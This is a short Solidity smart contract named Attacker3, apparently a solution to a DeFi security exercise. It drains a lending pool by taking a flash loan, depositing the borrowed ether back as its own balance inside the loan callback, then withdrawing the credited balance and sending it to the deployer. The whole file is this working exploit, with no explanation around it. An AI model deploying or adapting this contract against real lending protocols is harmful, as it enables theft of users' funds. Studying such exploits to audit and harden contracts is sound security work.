// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILender {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker3 {
    ILender lender;
    address private attacker;

    constructor(address _lender) {
        lender = ILender(_lender);
        attacker = msg.sender;
    }

    function exploit(uint256 amount) public {
        lender.flashLoan(amount);
        lender.withdraw();

        payable(attacker).transfer(address(this).balance);
    }

    function execute() external payable {
        lender.deposit{value: msg.value}();
    }

    receive() external payable {}
}